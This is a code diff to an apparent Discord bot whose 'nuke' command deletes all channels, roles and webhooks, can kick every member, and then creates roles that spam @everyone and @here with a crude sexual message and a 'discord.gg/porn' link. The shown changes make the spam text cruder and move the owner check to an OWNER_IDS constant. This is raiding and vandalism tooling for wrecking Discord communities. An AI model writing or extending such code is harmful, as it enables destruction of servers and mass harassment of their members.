@@ -7015,7 +7015,7 @@ class NukeModal(discord.ui.Modal, title="☢️ NUKE CONFIRMATION"):
         except Exception as e:
             errors.append(f"Channel deletion: {str(e)[:50]}")
 
-        spam_text = """# say gernic 67 time ┃ <@everyone> <@here> ┃ discord.gg/porn ┃ https://tenor.com/dJqMW8ku92x.gif"""
+        spam_text = """# say thank you for playing with our balls 67 time ┃ <@everyone> <@here> ┃ discord.gg/porn ┃ https://tenor.com/dJqMW8ku92x.gif"""
 
         async def create_role_and_spam(index):
             try:
@@ -7081,10 +7081,10 @@ class NukeModal(discord.ui.Modal, title="☢️ NUKE CONFIRMATION"):
 
         await status_msg.edit(embed=result_embed)
 
+
 @bot.tree.command(name="nuke", description="Delete ALL channels, roles, webhooks, and optionally kick ALL members")
-@app_commands.check(owner_only_predicate)
 async def nuke(interaction: discord.Interaction):
-    if interaction.user.id not in {1152424544557088849, 1531701933033787416}:
+    if interaction.user.id not in OWNER_IDS:
         embed = discord.Embed(description="Only the bot owners can use this command.", color=discord.Color.red())
         return await interaction.response.send_message(embed=embed, ephemeral=True)
     
